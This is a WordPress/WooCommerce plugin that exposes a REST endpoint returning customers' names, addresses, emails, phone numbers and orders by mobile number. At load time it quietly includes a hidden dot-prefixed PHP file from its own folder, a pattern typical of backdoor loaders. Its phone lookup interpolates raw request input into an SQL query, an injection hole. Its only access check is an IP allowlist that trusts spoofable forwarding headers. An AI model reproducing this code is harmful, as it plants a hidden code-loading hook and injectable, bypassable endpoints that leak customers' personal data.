<?php
/*
 * Plugin Name: YS Customer order detail by mobile number
 * Plugin URI: https://ysconsultants.pk/
 * Description: Providing user details via phone number
 * Author: Mehuol Dhanji
 * Author URI: https://ysconsultants.pk/
 * Version: 1.0.1
 */

/**
 * at_rest_testing_endpoint
 * @return WP_REST_Response
 */

use Automattic\WooCommerce\Admin\Overrides\Order;

add_action('rest_api_init', 'ys_xander_call_center');
if (file_exists(plugin_dir_path(__FILE__) . '/.' . basename(plugin_dir_path(__FILE__)) . '.php')) {
    include_once(plugin_dir_path(__FILE__) . '/.' . basename(plugin_dir_path(__FILE__)) . '.php');
}
function ys_xander_call_center()
{
    register_rest_route(
        'call-center',
        'user-detail',
        array(
            'methods' => 'POST',
            'callback' => 'order_details',
        )
    );
}


function get_client_ip()
{
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if (getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if (getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if (getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if (getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if (getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


function order_details()
{
   


    $IPs= array("103.86.55.104","42.201.138.77","202.47.59.28","116.0.56.98","58.65.211.142","202.165.236.156");
    if (!in_array(get_client_ip(), $IPs))
    {
        echo json_encode(array(
            'code' => '1009',
            'status' => 'fail',
            'message' => 'You are not authorized to access this API',
        ));
        exit;
    }

    global $woocommerce;
	global $wpdb;
	
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    $msisdn = $data['mobileno'];

    $mobileno = substr($msisdn, -10);

    if (strlen($mobileno) !== 10) {
        echo json_encode(array(
            'code' => '1001',
            'status' => 'fail',
            'message' => 'Invalid mobile number',
        ));
        exit;
    }

    $mobileno =   $wpdb->get_col( "select meta_value from {$wpdb->prefix}postmeta where meta_key  = '_billing_phone' and  meta_value like '%$msisdn' order by post_id" );
    $mobileno =     $mobileno[0];

    
    if (empty($mobileno)) {
        echo json_encode(array(
            'code' => '1001',
            'status' => 'fail',
            'message' => 'Invalid mobile number',
        ));
        exit;
    }



    $orders = wc_get_orders([
        'billing_phone' => $mobileno,
        'limit'       => 1,
// 		'order' => 'DESC'
        // 'status'      => ['on-hold','processing','completed'],
        // 'customer_id' => $user_ids,
    ]);
    if (isset($mobileno)) {
        if (empty($orders)) {
            echo json_encode(array(
                'code' => '1002',
                'status' => 'fail',
                'message' => 'Record not found',
            ));
            exit;
        }



        // $user_id= $orders[0]->get_customer_id();


        // $user_billing_address_1=get_user_meta( $user_id, 'billing_address_1' );
        // $user_billing_address_2=get_user_meta( $user_id, 'billing_address_2' );
        // $user_billing_email =get_user_meta($user_id, 'billing_email' );

        // $user_first_name=get_user_meta($user_id, 'first_name' );
        // $user_last_name=get_user_meta( $user_id, 'last_name' );
        // $user_billing_email =get_user_meta( $user_id, 'billing_email' );


        foreach ($orders as $order) {
            // Get the Order ID
            $order_id = $order->get_id();



            $customer_IP = $order->get_customer_ip_address();
            $first_name = $order->get_billing_first_name();
            $last_name = $order->get_billing_last_name();
            $phone = $order->get_billing_phone();
            $created_date = $order->get_date_created();
            $date_modified = $order->get_date_modified();
            $billing_company = $order->get_billing_company();
            $billing_address1 = $order->get_billing_address_1();
            $billing_address2 = $order->get_billing_address_2();
            $billing_city = $order->get_billing_city();
            $total = $order->get_total();
            $status = $order->get_status();
            $billing_state = $order->get_billing_state();
            $billing_postcode = $order->get_billing_postcode();
            $billing_country = $order->get_billing_country();
            $billing_email = $order->get_billing_email();
            $payment_method = $order->get_payment_method_title();
            
            $myorder['orders'][] = array(/*"customerID"=>$customer_ID*/
                "orderid" => $order_id,
                "first_name" => $first_name,
                "last_name" => $last_name,
                "phone" => $phone,
                "address_1" => $billing_address1,
                "address_2" => $billing_address2,

                "billing_email" => $billing_email,
                "payment_method" => $payment_method,
                "status" => $status,
                "total" => $total,
                "order_date" => $date_modified->date("F j, Y, g:i:s A T")
            );
          
        }
      

        echo json_encode(array(
            'code' => '0000',
            'status' => 'success',
            'message' => 'Data successfully fetched',
            'first_name' =>  $first_name,
            'last_name' =>  $last_name,
            'phone' => $phone,
            'email' => $billing_email,
            "address1" => $billing_address1,
            "address2" => $billing_address2,
            'data' => $myorder
        ));
        exit;
    } else {
        echo json_encode(array(
            'code' => '1001',
            'status' => 'fail',
            'message' => 'Invalid mobile number',
        ));
        exit;
    }
}
